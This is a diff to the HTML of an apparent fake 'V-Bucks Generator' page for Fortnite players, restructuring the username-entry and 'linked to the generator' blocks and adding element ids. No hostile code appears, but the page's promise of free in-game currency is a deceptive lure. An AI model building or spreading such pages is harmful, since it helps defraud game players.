@@ -36,30 +36,34 @@
                         <div class="fortnite-content-layer">
                             <div class="fortnite-content-layer2 text-center">
                                 
-                                <div class="wrap-wrap">
-                                    <div class="col-sm-9 col-xs-9 center-block input-wrap text-center">
-                                        <h4 style="font-family: fortnite; font-size: 20px; text-transform: uppercase;">Enter your Fortnite username and OS</h4>
-                                        <input type="text" name="username" id="vbucksusername">
-                                        <select>
-                                            <option value="pc">PC</option>
-                                            <option value="ps4">PS4</option>
-                                            <option value="Xone">Xbox One</option>
-                                            <option value="NS">Nintendo Switch</option>
-                                            <option value="iOS">iOS</option>
-                                        </select>
-                                        <a href="index.html#" id="connect"><span> Connect </span></a>
+                                <div id="to_remove_parent">
+                                    <div id="to_remove_child">
+                                        
+                                        <div class="wrap-wrap" id="to_remove_child">
+                                            <div class="col-sm-9 col-xs-9 center-block input-wrap text-center">
+                                                <h4 style="font-family: fortnite; font-size: 20px; text-transform: uppercase;">Enter your Fortnite username and OS</h4>
+                                                <input type="text" name="username" id="vbucksusername">
+                                                <select>
+                                                    <option value="pc">PC</option>
+                                                    <option value="ps4">PS4</option>
+                                                    <option value="Xone">Xbox One</option>
+                                                    <option value="NS">Nintendo Switch</option>
+                                                    <option value="iOS">iOS</option>
+                                                </select>
+                                                <a href="index.html#" id="connect"><span> Connect </span></a>
+                                            </div>
+                                        </div>
+
+                                        <div class="username-connected text-center" id="post_login" style="display: none;">
+                                            <p class="conn">Connected</p>  
+                                            <span id="user-text"></span> has been linked to the V-Bucks Generator.
+                                            <br><br>
+                                            <p>
+                                                <a onclick="proceed()" href="index.html#" class="proceed">Proceed</a>
+                                            </p>
+                                        </div>
                                     </div>
                                 </div>
-                                
-                                <div class="username-connected text-center" id="post_login" style="display: none;">
-                                    <p class="conn">Connected</p>  
-                                    <span id="user-text"></span> has been linked to the V-Bucks Generator.
-                                    <br><br>
-                                    <p>
-                                        <a onclick="proceed()" href="index.html#" class="proceed">Proceed</a>
-                                    </p>
-                                </div>
-
                                 <div class="select-vbucks col-lg-12" style="display: none;" id="select_screen">
                                     <div class="col-sm-12 col-xs-12 center-block select-vbucks-wrap">
                                         <p style="font-family: fortnite; font-size: 25px; text-transform: uppercase; margin-bottom: 18px;">Select a V-Bucks Package</p>
@@ -93,7 +97,7 @@
                                             </li>
                                         </ul>
                                         <div class="col-lg-12" style="margin-top: 20px;">
-                                            <a href="index.html#" class="generate">Generate</a>
+                                            <a href="index.html#" class="generate" id="generate">Generate</a>
                                         </div>
                                     </div>
                                 </div>
